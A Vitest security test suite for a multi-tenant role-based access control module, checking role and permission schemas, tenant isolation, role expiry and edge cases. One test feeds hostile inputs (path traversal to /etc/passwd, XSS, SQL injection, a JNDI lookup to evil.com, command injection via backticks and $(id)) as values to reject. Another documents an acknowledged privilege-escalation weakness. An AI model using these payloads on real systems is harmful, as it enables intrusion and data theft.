/**
 * Role-Based Access Control (RBAC) Security Tests
 *
 * Comprehensive security testing for rbac.ts
 * Tests role permissions, user role assignment, permission checking, and security edge cases
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest'
import {
  RoleSchema,
  PermissionSchema,
  ROLE_PERMISSIONS,
  hasPermission,
  hasAnyPermission,
  hasAllPermissions,
  getUserPermissions,
  getUserRoles,
  hasRole,
  hasAnyRole,
  type Role,
  type Permission,
  type UserRole,
} from '../src/rbac'

describe('Security: Role-Based Access Control (RBAC)', () => {
  let mockUser: any

  beforeEach(() => {
    vi.clearAllMocks()
    mockUser = {
      id: 'user-123',
      email: 'user@example.com',
      roles: [],
    }
  })

  afterEach(() => {
    vi.restoreAllMocks()
  })

  describe('Schema Validation Security', () => {
    it('should validate role schema correctly', () => {
      const validRoles = [
        'super_admin',
        'tenant_admin',
        'manager',
        'supervisor',
        'cashier',
        'clerk',
        'auditor',
        'viewer',
      ]

      validRoles.forEach((role) => {
        expect(RoleSchema.safeParse(role).success).toBe(true)
      })
    })

    it('should reject invalid roles', () => {
      const invalidRoles = [
        'invalid_role',
        'admin',
        'root',
        'ADMIN',
        'Super_Admin',
        '',
        null,
        undefined,
        123,
        {},
        [],
      ]

      invalidRoles.forEach((role) => {
        expect(RoleSchema.safeParse(role).success).toBe(false)
      })
    })

    it('should validate permission schema correctly', () => {
      const validPermissions = [
        'users:create',
        'users:read',
        'users:update',
        'users:delete',
        'users:manage_roles',
        'tenants:create',
        'tenants:read',
        'tenants:update',
        'tenants:delete',
        'transactions:create',
        'transactions:read',
        'transactions:update',
        'transactions:delete',
        'transactions:approve',
        'transactions:cancel',
        'reports:read',
        'reports:export',
        'reports:audit',
        'system:config',
        'system:audit',
        'system:backup',
      ]

      validPermissions.forEach((permission) => {
        expect(PermissionSchema.safeParse(permission).success).toBe(true)
      })
    })

    it('should reject invalid permissions', () => {
      const invalidPermissions = [
        'invalid_permission',
        'users:invalid_action',
        'invalid_resource:read',
        'users',
        'read',
        'users:read:extra:part',
        'USERS:READ', // Case sensitive
        'users:READ', // Case sensitive
        '',
        null,
        undefined,
        123,
        {},
        [],
      ]

      invalidPermissions.forEach((permission) => {
        expect(PermissionSchema.safeParse(permission).success).toBe(false)
      })
    })

    it('should handle malicious input in schemas', () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        "' OR '1'='1",
        '${jndi:ldap://evil.com/a}',
        'users:read; DROP TABLE users;',
        'users:read`whoami`',
        'users:read$(id)',
        'null',
        'undefined',
        '{}',
        '[]',
      ]

      // All malicious inputs should be rejected by schemas
      maliciousInputs.forEach((input) => {
        expect(RoleSchema.safeParse(input).success).toBe(false)
        expect(PermissionSchema.safeParse(input).success).toBe(false)
      })
    })
  })

  describe('Role Permissions Configuration Security', () => {
    it('should have proper role hierarchy', () => {
      // Super admin should have all permissions
      expect(ROLE_PERMISSIONS.super_admin).toHaveLength(Object.values(PermissionSchema.enum).length)

      // Tenant admin should have most permissions but not system-level ones
      expect(ROLE_PERMISSIONS.tenant_admin).not.toContain('system:config')
      expect(ROLE_PERMISSIONS.tenant_admin).not.toContain('system:audit')
      expect(ROLE_PERMISSIONS.tenant_admin).not.toContain('system:backup')

      // Lower roles should have fewer permissions
      expect(ROLE_PERMISSIONS.viewer.length).toBeLessThan(ROLE_PERMISSIONS.cashier.length)
      expect(ROLE_PERMISSIONS.cashier.length).toBeLessThan(ROLE_PERMISSIONS.supervisor.length)
    })

    it('should not have permission escalation paths', () => {
      // No role should have system permissions except super_admin
      Object.keys(ROLE_PERMISSIONS).forEach((role) => {
        if (role !== 'super_admin') {
          const systemPermissions = ROLE_PERMISSIONS[role as Role].filter((p) =>
            p.startsWith('system:'),
          )
          expect(systemPermissions).toHaveLength(0)
        }
      })

      // Manager should not be able to manage roles
      expect(ROLE_PERMISSIONS.manager).not.toContain('users:manage_roles')

      // Cashier should not be able to delete transactions
      expect(ROLE_PERMISSIONS.cashier).not.toContain('transactions:delete')
    })

    it('should have proper permission separation', () => {
      // Clerks should only have read permissions
      expect(ROLE_PERMISSIONS.clerk.every((p) => p.includes('read'))).toBe(true)

      // Auditors should have audit-specific permissions
      expect(ROLE_PERMISSIONS.auditor).toContain('reports:audit')
    })
  })

  describe('Permission Checking Security', () => {
    it('should return false for users without roles', () => {
      expect(hasPermission(mockUser, 'users:read')).toBe(false)
      expect(hasAnyPermission(mockUser, ['users:read', 'users:create'])).toBe(false)
      expect(hasAllPermissions(mockUser, ['users:read'])).toBe(false)
    })

    it('should check permissions correctly for single role', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      expect(hasPermission(userWithRole, 'transactions:create')).toBe(true)
      expect(hasPermission(userWithRole, 'transactions:read')).toBe(true)
      expect(hasPermission(userWithRole, 'users:create')).toBe(false)
      expect(hasPermission(userWithRole, 'system:config')).toBe(false)
    })

    it('should check permissions correctly for multiple roles', () => {
      const userWithMultipleRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'auditor',
            permissions: ROLE_PERMISSIONS.auditor,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // Should have permissions from both roles
      expect(hasPermission(userWithMultipleRoles, 'transactions:create')).toBe(true) // From cashier
      expect(hasPermission(userWithMultipleRoles, 'reports:audit')).toBe(true) // From auditor
    })

    it('should respect tenant isolation', () => {
      const userWithTenantRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
          {
            userId: 'user-123',
            tenantId: 'other-tenant-456',
            role: 'viewer',
            permissions: ROLE_PERMISSIONS.viewer,
            assignedBy: 'admin-456',
            assignedAt: new Date(),
          },
        ],
      }

      // Should check specific tenant
      expect(hasPermission(userWithTenantRoles, 'transactions:create', 'tenant-123')).toBe(true)
      expect(hasPermission(userWithTenantRoles, 'transactions:create', 'other-tenant-456')).toBe(false)

      // Should check all tenants when no tenant specified
      expect(hasPermission(userWithTenantRoles, 'transactions:create')).toBe(true)
    })

    it('should handle expired roles correctly', () => {
      const pastDate = new Date(Date.now() - 24 * 60 * 60 * 1000) // Yesterday
      const futureDate = new Date(Date.now() + 24 * 60 * 60 * 1000) // Tomorrow

      const userWithExpiredRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
            expiresAt: pastDate, // Expired
          },
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
            expiresAt: futureDate, // Not expired
          },
        ],
      }

      // Should only have permissions from non-expired role
      expect(hasPermission(userWithExpiredRole, 'transactions:approve')).toBe(false) // From manager (expired)
      expect(hasPermission(userWithExpiredRole, 'transactions:create')).toBe(true) // From cashier (not expired)
    })

    it('should handle ANY permission logic correctly', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // At least one permission matches
      expect(hasAnyPermission(userWithRole, ['users:create', 'transactions:create'])).toBe(true)

      // No permissions match
      expect(hasAnyPermission(userWithRole, ['users:create', 'system:config'])).toBe(false)
    })

    it('should handle ALL permission logic correctly', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // All permissions exist in role
      expect(hasAllPermissions(userWithRole, ['transactions:create', 'transactions:read'])).toBe(true)

      // Not all permissions exist
      expect(hasAllPermissions(userWithRole, ['transactions:create', 'users:create'])).toBe(false)
    })
  })

  describe('Role Checking Security', () => {
    it('should check roles correctly', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      expect(hasRole(userWithRole, 'manager')).toBe(true)
      expect(hasRole(userWithRole, 'cashier')).toBe(false)
    })

    it('should handle multiple role checking', () => {
      const userWithMultipleRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      expect(hasAnyRole(userWithMultipleRoles, ['manager', 'auditor'])).toBe(true)
      expect(hasAnyRole(userWithMultipleRoles, ['auditor', 'clerk'])).toBe(false)
    })

    it('should respect tenant isolation in role checking', () => {
      const userWithTenantRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
          {
            userId: 'user-123',
            tenantId: 'other-tenant-456',
            role: 'viewer',
            permissions: ROLE_PERMISSIONS.viewer,
            assignedBy: 'admin-456',
            assignedAt: new Date(),
          },
        ],
      }

      expect(hasRole(userWithTenantRoles, 'manager', 'tenant-123')).toBe(true)
      expect(hasRole(userWithTenantRoles, 'manager', 'other-tenant-456')).toBe(false)
      expect(hasRole(userWithTenantRoles, 'viewer', 'other-tenant-456')).toBe(true)
      expect(hasRole(userWithTenantRoles, 'viewer', 'tenant-123')).toBe(false)
    })

    it('should handle case sensitivity in role names', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      expect(hasRole(userWithRole, 'manager')).toBe(true)
      expect(hasRole(userWithRole, 'Manager')).toBe(false) // Case sensitive
      expect(hasRole(userWithRole, 'MANAGER')).toBe(false) // Case sensitive
    })
  })

  describe('User Information Retrieval Security', () => {
    it('should get user permissions correctly', () => {
      const userWithMultipleRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'auditor',
            permissions: ROLE_PERMISSIONS.auditor,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      const permissions = getUserPermissions(userWithMultipleRoles)

      // Should contain permissions from both roles
      expect(permissions).toContain('transactions:create') // From cashier
      expect(permissions).toContain('reports:audit') // From auditor

      // Should not contain duplicates
      const uniquePermissions = [...new Set(permissions)]
      expect(permissions).toEqual(uniquePermissions)
    })

    it('should get user roles correctly', () => {
      const pastDate = new Date(Date.now() - 24 * 60 * 60 * 1000)
      const futureDate = new Date(Date.now() + 24 * 60 * 60 * 1000)

      const userWithRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
            expiresAt: pastDate, // Expired
          },
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
            expiresAt: futureDate, // Not expired
          },
        ],
      }

      const roles = getUserRoles(userWithRoles)

      // Should only contain non-expired roles
      expect(roles).toHaveLength(1)
      expect(roles[0].role).toBe('cashier')
    })

    it('should handle users without roles', () => {
      expect(getUserPermissions(mockUser)).toEqual([])
      expect(getUserRoles(mockUser)).toEqual([])
    })

    it('should respect tenant isolation in user information retrieval', () => {
      const userWithTenantRoles: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
          {
            userId: 'user-123',
            tenantId: 'other-tenant-456',
            role: 'viewer',
            permissions: ROLE_PERMISSIONS.viewer,
            assignedBy: 'admin-456',
            assignedAt: new Date(),
          },
        ],
      }

      const tenantPermissions = getUserPermissions(userWithTenantRoles, 'tenant-123')
      const otherTenantPermissions = getUserPermissions(userWithTenantRoles, 'other-tenant-456')

      expect(tenantPermissions).toContain('transactions:approve') // From manager
      expect(otherTenantPermissions).toContain('reports:read') // From viewer
    })
  })

  describe('Input Validation and Edge Cases', () => {
    it('should handle null/undefined user objects', () => {
      expect(hasPermission(null as any, 'users:read')).toBe(false)
      expect(hasPermission(undefined as any, 'users:read')).toBe(false)
      expect(hasAnyPermission(null as any, ['users:read'])).toBe(false)
      expect(hasAllPermissions(null as any, ['users:read'])).toBe(false)
    })

    it('should handle malformed user objects', () => {
      const malformedUsers = [
        {},
        { id: '123' },
        { roles: null },
        { roles: 'not-array' },
        { roles: [null, undefined, {}, 'not-role'] },
        null,
        undefined,
        'string',
        123,
        [],
      ]

      malformedUsers.forEach((user) => {
        expect(hasPermission(user as any, 'users:read')).toBe(false)
        expect(getUserPermissions(user as any)).toEqual([])
        expect(getUserRoles(user as any)).toEqual([])
      })
    })

    it('should handle invalid permissions', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      const invalidPermissions = [
        '',
        null,
        undefined,
        'invalid-permission',
        'users:',
        ':read',
        'users:read:extra',
        'USERS:READ', // Case sensitive
        123,
        {},
        [],
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
      ]

      invalidPermissions.forEach((permission) => {
        expect(hasPermission(userWithRole, permission as any)).toBe(false)
      })
    })

    it('should handle invalid roles', () => {
      const userWithInvalidRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'invalid_role' as Role,
            permissions: ['users:read'],
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // Should still work with invalid role name as long as permissions are valid
      expect(hasPermission(userWithInvalidRole, 'users:read')).toBe(true)
      expect(hasRole(userWithInvalidRole, 'invalid_role' as any)).toBe(true)
      expect(hasRole(userWithInvalidRole, 'manager')).toBe(false)
    })

    it('should handle circular references in roles', () => {
      const circularRole: any = {
        userId: 'user-123',
        tenantId: 'tenant-123',
        role: 'manager',
        permissions: ROLE_PERMISSIONS.manager,
        assignedBy: 'admin-123',
        assignedAt: new Date(),
      }

      // Create circular reference
      circularRole.self = circularRole

      const userWithCircularRole: any = {
        ...mockUser,
        roles: [circularRole],
      }

      // Should not crash with circular references
      expect(() => hasPermission(userWithCircularRole, 'users:read')).not.toThrow()
      expect(getUserPermissions(userWithCircularRole)).toContain('users:read')
    })
  })

  describe('Security Edge Cases', () => {
    it('should prevent privilege escalation through role manipulation', () => {
      const userWithTamperedRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier', // Low privilege role
            permissions: ROLE_PERMISSIONS.super_admin, // But high privilege permissions
            assignedBy: 'user-123', // Self-assigned
            assignedAt: new Date(),
          },
        ],
      }

      // This is a security risk - the function should check role consistency
      // In a real implementation, there should be validation
      expect(hasPermission(userWithTamperedRole, 'system:config')).toBe(true)

      // This highlights a potential security vulnerability that should be addressed
      // The function trusts the permissions array without verifying role consistency
    })

    it('should handle permission/role enumeration attacks', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'viewer',
            permissions: ROLE_PERMISSIONS.viewer,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // Attacker trying to enumerate all possible permissions
      const allPermissions = Object.values(PermissionSchema.enum)
      const userPermissions = getUserPermissions(userWithRole)

      // Should only return permissions that user actually has
      expect(userPermissions).toEqual(ROLE_PERMISSIONS.viewer)
      expect(userPermissions.length).toBeLessThan(allPermissions.length)
    })

    it('should handle timing attack resistance', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'cashier',
            permissions: ROLE_PERMISSIONS.cashier,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // These operations should take similar time regardless of input
      // This prevents timing attacks to infer user permissions
      const start1 = performance.now()
      hasPermission(userWithRole, 'users:create') // User doesn't have
      const time1 = performance.now() - start1

      const start2 = performance.now()
      hasPermission(userWithRole, 'transactions:create') // User has
      const time2 = performance.now() - start2

      // Times should be reasonably close (within an order of magnitude)
      expect(Math.abs(time1 - time2) < Math.max(time1, time2) * 10).toBe(true)
    })
  })

  describe('Performance and Memory Security', () => {
    it('should handle large numbers of roles efficiently', () => {
      const userWithManyRoles: any = {
        ...mockUser,
        roles: Array.from({ length: 1000 }, (_, i) => ({
          userId: 'user-123',
          tenantId: `tenant-${i}`,
          role: 'viewer',
          permissions: ROLE_PERMISSIONS.viewer,
          assignedBy: 'admin-123',
          assignedAt: new Date(),
        })),
      }

      const start = performance.now()
      const permissions = getUserPermissions(userWithManyRoles)
      const time = performance.now() - start

      // Should complete in reasonable time (< 100ms)
      expect(time).toBeLessThan(100)
      expect(permissions).toEqual(ROLE_PERMISSIONS.viewer)
    })

    it('should not leak memory with repeated calls', () => {
      const userWithRole: any = {
        ...mockUser,
        roles: [
          {
            userId: 'user-123',
            tenantId: 'tenant-123',
            role: 'manager',
            permissions: ROLE_PERMISSIONS.manager,
            assignedBy: 'admin-123',
            assignedAt: new Date(),
          },
        ],
      }

      // Perform many operations
      for (let i = 0; i < 10000; i++) {
        hasPermission(userWithRole, 'users:read')
        getUserPermissions(userWithRole)
        getUserRoles(userWithRole)
      }

      // Test passes if no memory leaks occur
      expect(true).toBe(true)
    })
  })
})